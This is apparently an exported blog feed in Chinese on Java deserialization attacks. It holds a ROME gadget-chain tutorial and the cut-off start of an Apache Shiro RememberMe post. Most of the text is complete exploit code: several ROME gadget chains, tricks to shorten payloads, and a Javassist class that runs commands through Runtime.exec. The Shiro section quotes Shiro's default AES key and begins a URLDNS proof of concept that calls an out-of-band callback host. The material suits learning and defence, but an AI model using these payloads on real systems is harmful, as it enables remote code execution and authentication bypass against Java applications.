package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        setField(templatesimpl,&quot;_name&quot;,&quot;aaa&quot;);        setField(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);        setField(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);        HashMap&lt;Object ,Object&gt; hashMap = new HashMap();        hashMap.put(1,1);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,equalsBean);            &#125;        &#125;        byte[] bytes = ser(hashMap);        unser(bytes);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

其他利用链下面几种ROME利用链的后半段较为固定，都是使用TemplatesImpl.getOutputProperties()进行任意类加载，所以这里的其他利用链都是针对前半段入口处进行替换的
ObjectBean其实这个才是yso中的利用链
在ObjectBean.hashcode()中调用了EqualsBean.beanHashCode()，其作用和EqualsBean.hashCode()等价
public ObjectBean(Class beanClass, Object obj) &#123;        this(beanClass, obj, (Set)null);    &#125; public ObjectBean(Class beanClass, Object obj, Set ignoreProperties) &#123;        this._equalsBean = new EqualsBean(beanClass, obj);        this._toStringBean = new ToStringBean(beanClass, obj);        this._cloneableBean = new CloneableBean(obj, ignoreProperties);    &#125;... public int hashCode() &#123;        return this._equalsBean.beanHashCode();    &#125;

可以将EqualsBean.hashCode()替换为ObjectBean.hashcode()，利用链如下
* TemplatesImpl.getOutputProperties()* ToStringBean.toString(String)* ToStringBean.toString()* EqualsBean.beanHashCode()* ObjectBean.hashcode()* HashMap&lt;K,V&gt;.hash(Object)* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)

POC如下
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ObjectBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        setField(templatesimpl,&quot;_name&quot;,&quot;aaa&quot;);        setField(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);        setField(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);        HashMap&lt;Object ,Object&gt; hashMap = new HashMap();        hashMap.put(1,1);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,objectBean);            &#125;        &#125;        byte[] bytes = ser(hashMap);        unser(bytes);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

HashTableHashTable利用链其实并不是针对ROME的利用链。其作用是替换作为反序列化入口的HashMap类，如果漏洞过滤了HashMap类，我们就可以使用HashTable类进行替换
我们看一下HashTable的readObject方法，在该方法的末尾有如下代码：
可知对于HashTable里面的每一个元素都会调用reconstitutionPut方法
我们跟进该方法

调用key的hashCode()方法，那就很明确了，我们只要让HashTable里面的参数key值为ObjectBean对象就可以了
利用链如下
* TemplatesImpl.getOutputProperties()* ToStringBean.toString(String)* ToStringBean.toString()* EqualsBean.beanHashCode()* ObjectBean.hashcode()* HashMap&lt;K,V&gt;.hash(Object)* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)

poc：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ObjectBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Hashtable;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        setField(templatesimpl,&quot;_name&quot;,&quot;aaa&quot;);        setField(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);        setField(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);        Hashtable&lt;Object,Object&gt; hashtable = new Hashtable();        hashtable.put(objectBean,&quot;1&quot;);        byte[] bytes = ser(hashtable);        unser(bytes);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

BadAttributeValueExpException其实提起toString()方法的话，还有一个类BadAttributeValueExpException与其有关，在该类中的readObject()方法中能够调用任意类的toString()方法
public BadAttributeValueExpException (Object val) &#123;        this.val = val == null ? null : val.toString();    &#125; ... private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;        ObjectInputStream.GetField gf = ois.readFields();        Object valObj = gf.get(&quot;val&quot;, null);         if (valObj == null) &#123;            val = null;        &#125; else if (valObj instanceof String) &#123;            val= valObj;        &#125; else if (System.getSecurityManager() == null                || valObj instanceof Long                || valObj instanceof Integer                || valObj instanceof Float                || valObj instanceof Double                || valObj instanceof Byte                || valObj instanceof Short                || valObj instanceof Boolean) &#123;            val = valObj.toString();        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();        &#125;    &#125;

在CC5中，正是利用这个类来调用任意类的toString()方法
但是嘞，BadAttributeValueExpException类的构造函数里面也调用了toString()方法
所以为了避免提前触发，我们就需要通过反射来修改参数val的值
利用链如下：
* TemplatesImpl.getOutputProperties()* ToStringBean.toString(String)* ToStringBean.toString()* BadAttributeValueExpException.readObject()

poc：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.ToStringBean;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        setValue(templatesimpl,&quot;_name&quot;,&quot;aaa&quot;);        setValue(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);        setValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);        setValue(badAttributeValueExpException,&quot;val&quot;,toStringBean);        byte[] bytes = ser(badAttributeValueExpException);        unser(bytes);    &#125;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

HotSwappableTargetSource这条是spring原生的toString利用链，调用链如下
* HashMap.readObject* HashMap.putVal* HotSwappableTargetSource.equals* XString.equals* ToStringBean.toString

public class ROME_HotSwappableTargetSource &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templatesimpl = new TemplatesImpl();         byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;D:\\CTF\\Security_Learning\\ROME\\target\\classes\\shell.class&quot;));         setValue(templatesimpl,&quot;_name&quot;,&quot;aaa&quot;);        setValue(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);        setValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());         ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templatesimpl);        toStringBean.toString();         HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;xxx&quot;));         HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(h1,h1);        hashMap.put(h2,h2);         Serial.Serialize(hashMap);        Serial.DeSerialize(&quot;ser.bin&quot;);    &#125;     public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125; &#125;

JdbcRowSetImplJdbcRowSetImpl利用链是针对后半段TemplatesImpl.getOutputProperties()任意类加载进行替换的。JdbcRowSetImpl利用链的结果是能造成JNDI注入，于是下面就可以配合RMI或者LDAP服务进行攻击了。
由于JDNI注入中trustURLCodebase的限制，这里限制的攻击版本为

RMI：JDK 6u132、JDK 7u122、JDK 8u113之前
LDAP：JDK 7u201、8u191、6u211、JDK 11.0.1之前

我们知道，在Fastjson反序列化漏洞中能造成JNDI注入的同样是JdbcRowSetImpl这条链。问题出在JdbcRowSetImpl.getDatabaseMetaData()这个getter上
（更具体的关于jndi注入的信息可以去翻我前面的文章）
poc：
package org.example;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        String url = &quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;;        jdbcRowSet.setDataSourceName(url);        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;aaa&quot;, &quot;123&quot;);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,equalsBean);            &#125;        &#125;        byte[] bytes = ser(hashMap);        unser(bytes);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

精简payload在某些情况下，网站可能会对反序列化数据的长度有一定限制，所以有必要通过一些手段来缩短Payload。
各Gadget长度比较为了方便比较，这里的长度指Payload经base64之后的长度



Gadget
长度



BadAttributeValueExpException利用链
3620


ObjectBean利用链
3428


HashTable利用链
3484


EqualsBean利用链
2920


这里最短的是EqualsBean利用链，那么下面我就以该利用链为例，继续缩短我们Payload的长度。
使用Javassist缩短恶意class什么是JavassistJava 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。
ClassPoolClassPool是CtClass对象的容器。CtClass对象必须从该对象获得。如果get()在此对象上调用，则它将搜索表示的各种源ClassPath 以查找类文件，然后创建一个CtClass表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放CtClass对象的容器。
获得方法： ClassPool cp = ClassPool.getDefault();。通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。
cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));

CtClass可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以ClassPool.get(ClassName)中获取。
CtMethod同理，可以理解成加强版的Method对象。可通过CtClass.getDeclaredMethod(MethodName)获取，该类提供了一些方法以便我们能够直接修改方法体
public final class CtMethod extends CtBehavior &#123;    // 主要的内容都在父类 CtBehavior 中&#125; // 父类 CtBehaviorpublic abstract class CtBehavior extends CtMember &#123;    // 设置方法体    public void setBody(String src);     // 插入在方法体最前面    public void insertBefore(String src);     // 插入在方法体最后面    public void insertAfter(String src);     // 在方法体的某一行插入内容    public int insertAt(int lineNum, String src); &#125;

传递给方法 insertBefore() ，insertAfter() 和 insertAt() 的 String 对象是由Javassist 的编译器编译的。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：



符号
含义



$0,$1, $2, …
$0 &#x3D; this; $1 &#x3D; args[1] …..


$args
方法参数数组.它的类型为 Object[]


$$
所有实参。例如, m($$) 等价于 m(1,2,…)


$cflow(…)
cflow 变量


$r
返回结果的类型，用于强制类型转换


$w
包装器类型，用于强制类型转换


$_
返回值


$sig
类型为 java.lang.Class 的参数类型数组


$type
一个 java.lang.Class 对象，表示返回值类型


$class
一个 java.lang.Class 对象，表示当前正在修改的类


javassist依赖&lt;dependency&gt;  &lt;groupId&gt;org.javassist&lt;/groupId&gt;  &lt;artifactId&gt;javassist&lt;/artifactId&gt;  &lt;version&gt;3.25.0-GA&lt;/version&gt;&lt;/dependency&gt;

精简gadget其实在Gedgat的调用流程中，仍有一些细节可以优化，比如

TemplatesImpl._name的长度可以为1
TemplatesImpl._tfactory可以不用赋值
HashMap的value长度可以为1

最终Poc如下
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        setField(templatesimpl,&quot;_name&quot;,&quot;a&quot;);        setField(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);//        setField(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);        HashMap&lt;Object ,Object&gt; hashMap = new HashMap();        hashMap.put(1,1);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,equalsBean);            &#125;        &#125;        byte[] bytes = ser(hashMap);        unser(bytes);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

Payload最短长度为EqualsBean利用链的1340字符。其实在反序列化数据中还有一些无用字符，去掉这些无用字符也不会影响反序列化流程，所以Payload理论上还能更短
下面一个是有利用到javassist来生成payload的poc：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import sun.reflect.ReflectionFactory;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        ToStringBean toStringBean = createObjWithoutConstructor(ToStringBean.class);        setField(toStringBean,&quot;_obj&quot;,getTemplates());        setField(toStringBean,&quot;_beanClass&quot;, Templates.class);        EqualsBean equalsBean = createObjWithoutConstructor(EqualsBean.class);        setField(equalsBean,&quot;_obj&quot;,toStringBean);        hashMap.put(1,1);        setHashMapKey(hashMap,1,equalsBean);        unser(ser(hashMap));    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;    public static  void setHashMapKey(HashMap hashMap,Object oldKey,Object newKey) throws Exception&#123;        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            // System.out.println(entry);            if (entry!= null)&#123;                Field keyField = entry.getClass().getDeclaredField(&quot;key&quot;);                keyField.setAccessible(true);                Object keyValue = keyField.get(entry);                if (keyValue.equals(oldKey))                    setField(entry,&quot;key&quot;,newKey);            &#125;        &#125;    &#125;    public static byte[] getEvilBytes(String cmd) throws Exception&#123;        ClassPool classPool = ClassPool.getDefault();        CtClass ctClass = classPool.makeClass(&quot;evil&quot;);        String code = &quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;&quot;+cmd+&quot;\&quot;);&#125;&quot;;        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));        CtConstructor constructor = ctClass.makeClassInitializer();        constructor.insertBefore(code);//        ctClass.writeFile();        return ctClass.toBytecode();    &#125;    public static Templates getTemplates() throws Exception&#123;        byte[][] bytes = new byte[][]&#123;getEvilBytes(&quot;calc&quot;)&#125;;        TemplatesImpl templates = new TemplatesImpl();        Class&lt;?&gt; templatesClass = templates.getClass();        Field _bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);        _bytecodesField.setAccessible(true);        _bytecodesField.set(templates,bytes);        Field _nameField = templatesClass.getDeclaredField(&quot;_name&quot;);        _nameField.setAccessible(true);        _nameField.set(templates,&quot;666&quot;);        Field _transletIndexField = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);        _transletIndexField.setAccessible(true);        _transletIndexField.set(templates,0);        Field _tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);        _tfactoryField.setAccessible(true);        _tfactoryField.set(templates,new TransformerFactoryImpl());        return templates;    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static &lt;T&gt; T createObjWithConstructor (Class&lt;T&gt; clazz,Class&lt;? super T&gt; superClazz,Class&lt;?&gt;[] argsTypes,Object[] argsValues) throws Exception&#123;        Constructor&lt;?super T&gt; constructor = superClazz.getDeclaredConstructor(argsTypes);        constructor.setAccessible(true);        Constructor&lt;?&gt; constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return (T) constructor1.newInstance(argsValues);    &#125;    public static &lt;T&gt; T createObjWithoutConstructor(Class&lt;T&gt; clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return (T) constructor1.newInstance();    &#125;&#125;
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之shiro反序列化</title>
    <url>/2024/11/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[感谢P神提供的环境：shirodemo
环境部署具体过程这边看
账号密码：root/secret
序列化Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie；数据通过Cookie中rememberMe的值传入后端之后，经过解密，反序列化获得到存储的数据
全局搜索cookie，选中CookieRemberMeManager类文件

我们对该文件进行审计，找到了以下的关键函数rememberSerializedIdentity(Subject subject, byte[] serialized)

可以看到函数中对参数serialized进行了base64编码并储存到了cookie当中，参数serialized肯定是跟序列化后的内容有关系，我们现在找一下哪个方法调用了该函数，在文件AbstractRememberMeManager.java中

可以看到rememberIdentity方法传入了一个subject对象以及一个PrincipalCollection对象，先对principals对象进行一个序列化，然后再经过加密后返回字节流
看该方法中传入rememberSerializedIdentity方法的参数serialized其实就是bytes参数，经过了一个方法的处理，我们跟进该convertPrincipalsToBytes方法
protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;        byte[] bytes = serialize(principals);        if (getCipherService() != null) &#123;            bytes = encrypt(bytes);        &#125;        return bytes;    &#125;

对参数principals先进行序列化，再判定getCipherService()是否为空，跟进
public CipherService getCipherService() &#123;        return cipherService;    &#125;

继续跟进，可以发现其是定义在构造函数中的
public AbstractRememberMeManager() &#123;        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    &#125;

继续持续跟进，最后会发现cipherService赋值为AES，不为空，进入if从句，跟进encrypt方法
protected byte[] encrypt(byte[] serialized) &#123;    byte[] value = serialized;    CipherService cipherService = getCipherService();    if (cipherService != null) &#123;        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());        value = byteSource.getBytes();    &#125;    return value;&#125;

默认的key也在构造函数此处设定了setCipherKey(DEFAULT_CIPHER_KEY_BYTES)，跟进后可以看到默认的key已经明文显示在那边了
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);

反序列化既然有序列化流程，那肯定也会有反序列化流程，所以我们直接搜索deserialize()方法，直接定位到convertBytesToPrincipals方法
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;    if (getCipherService() != null) &#123;        bytes = decrypt(bytes);    &#125;    return deserialize(bytes);&#125;

if从句中解密方法没什么特别之处，我们重点看一下deserialize函数，看看有没有什么过滤，跟进进去
protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123;        return getSerializer().deserialize(serializedIdentity);    &#125;

getSerializer()方法就是获取类DefaultSerializer，跟进该类中查找deserialize方法
public T deserialize(byte[] serialized) throws SerializationException &#123;    if (serialized == null) &#123;        String msg = &quot;argument cannot be null.&quot;;        throw new IllegalArgumentException(msg);    &#125;    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try &#123;        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to deserialze argument byte array.&quot;;        throw new SerializationException(msg, e);    &#125;&#125;

可以发现就是单纯的反序列化，没有进行任何的过滤，黑名单限制等，读取后直接走入readObject中
POC根据上面序列化的流程我们可以得出cookie的序列化流程为：
对象进行序列化	使用base64解码后的密钥对序列化后的字节流进行加密		使用base64编码aes加密后的流，最终返回base64编码后的cookie

反序列化漏洞的poc自然就是URLDNS链了，对hashmap序列化之后，按照shiro的加密流程以及默认密钥构造poc
package sherlock;import org.apache.shiro.codec.Base64;import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Poc &#123;    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception&#123;        Field field = object.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object, value);    &#125;    public static byte[] getPayload() throws Exception &#123;        URL url = new URL(&quot;http://a2dz0r9p5z2ofy7sh8ymezjev51wppde.oastify.com&quot;);        HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;();        Class&lt;?&gt; c = url.getClass();        Field field = c.getDeclaredField(&quot;hashCode&quot;);        field.setAccessible(true);        field.set(url,114514);        hashMap.put(url,11);        field.setAccessible(true);        